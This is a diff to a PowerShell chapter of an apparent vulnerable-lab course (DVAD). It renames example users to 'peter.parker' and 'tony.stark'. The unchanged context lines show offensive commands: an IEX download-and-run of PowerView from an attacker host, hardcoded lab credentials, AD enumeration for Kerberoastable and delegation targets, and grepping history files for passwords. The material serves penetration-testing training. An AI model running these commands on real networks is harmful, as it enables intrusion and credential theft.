@@ -242,7 +242,7 @@ What if: Performing the operation "Remove File" on target "C:\Important\file2.tx
 
 ### Variables
 
-`$name = "alice"` — sigil `$` for variables. Untyped by default; you can pin a type:
+`$name = "peter.parker"` — sigil `$` for variables. Untyped by default; you can pin a type:
 
 ```
 [int]$n = 42
@@ -294,7 +294,7 @@ function Foo {
 `$using:` is a special prefix used to capture a parent variable into a remote scriptblock:
 
 ```
-$user = "alice"
+$user = "peter.parker"
 Invoke-Command -ComputerName dc01 -ScriptBlock { Get-ADUser $using:user }
 ```
 
@@ -397,8 +397,8 @@ PowerShell has multiple streams: 1 success, 2 error, 3 warning, 4 verbose, 5 deb
 **Double quotes** interpolate variables:
 
 ```
-PS> $name = "alice"
-PS> "Hello, $name"               # Hello, alice
+PS> $name = "peter.parker"
+PS> "Hello, $name"               # Hello, peter.parker
 PS> "User: $($obj.Name)"         # subexpression
 PS> "Path: $env:USERPROFILE"
 ```
@@ -458,17 +458,17 @@ The `-f` operator follows .NET's composite formatting. `{0:N2}` for 2 decimals, 
 PowerShell's `-match` / `-replace` use .NET regex (`System.Text.RegularExpressions.Regex`):
 
 ```
-PS> "alice@corp.local" -match '(?<u>[^@]+)@(?<d>.+)'
+PS> "peter.parker@corp.local" -match '(?<u>[^@]+)@(?<d>.+)'
 True
 PS> $matches.u
-alice
+peter.parker
 PS> $matches.d
 corp.local
 
 PS> "abc123" -replace '(\D+)(\d+)','$2-$1'
 123-abc
 
-PS> [regex]::Matches("admin1,user2,svc3","(\w+?)(\d+)") |
+PS> [regex]::Matches("admin1,tony.stark,svc3","(\w+?)(\d+)") |
        ForEach-Object { [pscustomobject]@{ Name = $_.Groups[1].Value; Num = $_.Groups[2].Value } }
 ```
 
@@ -507,7 +507,7 @@ $list.AddRange(@($y, $z))
 ### Hashtables
 
 ```
-$h = @{ Name = "alice"; Id = 42; Groups = @("admins","users") }
+$h = @{ Name = "peter.parker"; Id = 42; Groups = @("admins","users") }
 $h.Name; $h["Id"]
 $h.Keys; $h.Values
 $h.ContainsKey("Name")
@@ -530,7 +530,7 @@ The idiomatic record type:
 
 ```
 $user = [pscustomobject]@{
-    Name = "alice"
+    Name = "peter.parker"
     Sid  = "S-1-5-21-...-1109"
     Groups = @("Domain Users","Authenticated Users")
 }
@@ -574,7 +574,7 @@ function Greet {
     param([string]$Name = "world")
     "Hello, $Name"
 }
-Greet -Name alice              # Hello, alice
+Greet -Name peter.parker              # Hello, peter.parker
 ```
 
 ### Advanced function (cmdlet-style)
@@ -597,7 +597,7 @@ function Get-CompromisedUser {
     end     { Write-Verbose "Done" }
 }
 
-"alice","bob" | Get-CompromisedUser -Verbose
+"peter.parker","tony.stark" | Get-CompromisedUser -Verbose
 ```
 
 `[CmdletBinding()]` unlocks `-Verbose`, `-Debug`, `-ErrorAction`, and the `$PSCmdlet` automatic variable. `begin/process/end` blocks let your function stream pipeline input.
@@ -749,7 +749,7 @@ These use **WS-Management (WinRM)** — HTTP on 5985, HTTPS on 5986. Same protoc
 ```
 $cred = Get-Credential                                       # prompts (interactive only)
 $sec  = ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force
-$cred = New-Object PSCredential('corp\alice', $sec)
+$cred = New-Object PSCredential('corp\peter.parker', $sec)
 
 Invoke-Command -ComputerName dc01 -Credential $cred -ScriptBlock { whoami }
 ```
@@ -786,7 +786,7 @@ You connect to `dc01` over WinRM. From inside that session, you try to access `\
 - **CredSSP** — `Enable-WSManCredSSP -Role Client -DelegateComputer dc01` on your box and `-Role Server` on dc01. Then `Invoke-Command -Authentication CredSSP -Credential $cred`. Server now has your plaintext credentials in memory, which is the security cost.
 - **Kerberos delegation** — set up Resource-Based Constrained Delegation (RBCD) or unconstrained delegation on dc01. Production-clean.
 - **Use a Kerberos ticket** — if you have a valid TGT and it's flagged forwardable, you can S4U2Self/S4U2Proxy via tools. Beyond chapter 3 scope.
-- **Pass plaintext credentials inside the scriptblock** — `Invoke-Command -ComputerName dc01 { net use \\file01\share /user:corp\alice DVADlab2024! }`. Works but echoes creds; loud.
+- **Pass plaintext credentials inside the scriptblock** — `Invoke-Command -ComputerName dc01 { net use \\file01\share /user:corp\peter.parker DVADlab2024! }`. Works but echoes creds; loud.
 
 In DVAD, several lateral paths run into the double-hop. When they do, the lab usually has unconstrained delegation on a member server to abuse (DF-006 / LAT-018 territory).
 
@@ -831,7 +831,7 @@ Auto-available on DCs and member servers with `RSAT-AD-PowerShell` installed:
 PS> Import-Module ActiveDirectory
 PS> Get-ADDomain
 PS> Get-ADForest
-PS> Get-ADUser -Identity alice -Properties *
+PS> Get-ADUser -Identity peter.parker -Properties *
 PS> Get-ADUser -Filter * | Select-Object SamAccountName, Enabled
 PS> Get-ADGroup -Identity "Domain Admins"
 PS> Get-ADGroupMember "Domain Admins" -Recursive
@@ -871,22 +871,22 @@ The connection uses the current user's Kerberos context against the closest DC. 
 ```
 PS> $root = [adsi]"LDAP://10.10.0.10/DC=corp,DC=local"
 PS> $root.Path
-PS> $s = [adsisearcher]::new($root, "(samaccountname=alice)")
+PS> $s = [adsisearcher]::new($root, "(samaccountname=peter.parker)")
 PS> $s.FindOne().Properties
 
 # With alternate credentials:
-PS> $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://10.10.0.10/DC=corp,DC=local","corp\alice","DVADlab2024!"
-PS> $s = [adsisearcher]::new($de, "(samaccountname=alice)")
+PS> $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://10.10.0.10/DC=corp,DC=local","corp\peter.parker","DVADlab2024!"
+PS> $s = [adsisearcher]::new($de, "(samaccountname=peter.parker)")
 ```
 
-The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'CORP\alice' -w '…' -b 'DC=corp,DC=local' '(samaccountname=alice)'`.
+The Kali equivalent is `ldapsearch -H ldap://10.10.0.10 -D 'CORP\peter.parker' -w '…' -b 'DC=corp,DC=local' '(samaccountname=peter.parker)'`.
 
 ### LDAP filter syntax (mirror to chapter 04)
 
 ```
 (objectClass=user)
 (&(objectClass=user)(objectCategory=person))
-(|(samaccountname=alice)(samaccountname=bob))
+(|(samaccountname=peter.parker)(samaccountname=tony.stark))
 (!(objectClass=group))
 (memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)
 (&(objectClass=user)(servicePrincipalName=*))
@@ -1014,7 +1014,7 @@ That last one is BloodHound-lite for the lateral graph.
 
 ### PowerView vs BloodHound
 
-PowerView gives you ad-hoc queries. **BloodHound** ingests data (via `SharpHound.exe` or `bloodhound-python`) into a Neo4j graph and lets you ask "shortest path from `alice` to Domain Admins." You'll use both: BloodHound for strategy, PowerView for tactics on the host.
+PowerView gives you ad-hoc queries. **BloodHound** ingests data (via `SharpHound.exe` or `bloodhound-python`) into a Neo4j graph and lets you ask "shortest path from `peter.parker` to Domain Admins." You'll use both: BloodHound for strategy, PowerView for tactics on the host.
 
 ---
 
@@ -1121,8 +1121,8 @@ To convert non-terminating to terminating, pass `-ErrorAction Stop` to the cmdle
 Anything you can do in C# you can do in PowerShell because .NET classes are first-class. The syntax `[Namespace.Type]::Method(args)`:
 
 ```
-[System.IO.File]::ReadAllText("C:\Users\alice\Desktop\notes.txt")
-[System.IO.File]::ReadAllBytes("C:\Users\alice\Desktop\image.png")
+[System.IO.File]::ReadAllText("C:\Users\peter.parker\Desktop\notes.txt")
+[System.IO.File]::ReadAllBytes("C:\Users\peter.parker\Desktop\image.png")
 [System.Net.WebClient]::new().DownloadString("http://10.10.0.1/x")
 [System.Net.WebRequest]::Create("http://10.10.0.1/y").GetResponse()
 [System.Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
@@ -1305,7 +1305,7 @@ Keep this card. Most of your DVAD session will be one of these.
 
 ### Exercise 3.A — First commands
 
-In an `evil-winrm` session as `alice`:
+In an `evil-winrm` session as `peter.parker`:
 
 ```
 *Evil-WinRM* PS> Get-Date
@@ -1364,7 +1364,7 @@ On the victim:
 *Evil-WinRM* PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.1:8000/PowerView.ps1')
 *Evil-WinRM* PS> Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
 *Evil-WinRM* PS> Get-DomainUser -PreauthNotRequired
-*Evil-WinRM* PS> Find-InterestingDomainAcl -ResolveGUIDs | Where-Object IdentityReferenceName -eq 'alice'
+*Evil-WinRM* PS> Find-InterestingDomainAcl -ResolveGUIDs | Where-Object IdentityReferenceName -eq 'peter.parker'
 *Evil-WinRM* PS> Get-DomainComputer -Unconstrained
 *Evil-WinRM* PS> Get-DomainTrust
 *Evil-WinRM* PS> Find-LocalAdminAccess
@@ -1419,7 +1419,7 @@ Get-ChildItem @gciParams | Select-Object FullName, Length
 *Evil-WinRM* PS> if (Test-Path $h) { Get-Content $h | Select-String -Pattern 'password|secret|cred|key|token' -SimpleMatch }
 ```
 
-You won't always find something here on `alice`'s box. Try the same on every host you compromise. CRED-022 hides in one of them.
+You won't always find something here on `peter.parker`'s box. Try the same on every host you compromise. CRED-022 hides in one of them.
 
 ### Exercise 3.G — Encoded command
 
@@ -1440,7 +1440,7 @@ Then:
 
 ```
 *Evil-WinRM* PS> $targets = @('10.10.0.10','10.10.0.13','10.10.0.14','10.10.0.100')
-*Evil-WinRM* PS> $cred = New-Object PSCredential('corp\alice', (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force))
+*Evil-WinRM* PS> $cred = New-Object PSCredential('corp\peter.parker', (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force))
 *Evil-WinRM* PS> Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
                     [pscustomobject]@{
                         Host = $env:COMPUTERNAME
@@ -1450,7 +1450,7 @@ Then:
                  } -ThrottleLimit 5
 ```
 
-If access denied on some hosts, that's expected (alice isn't admin everywhere). The error/success per host is your local-admin map. Cross-reference with `Find-LocalAdminAccess`.
+If access denied on some hosts, that's expected (peter.parker isn't admin everywhere). The error/success per host is your local-admin map. Cross-reference with `Find-LocalAdminAccess`.
 
 ---
 
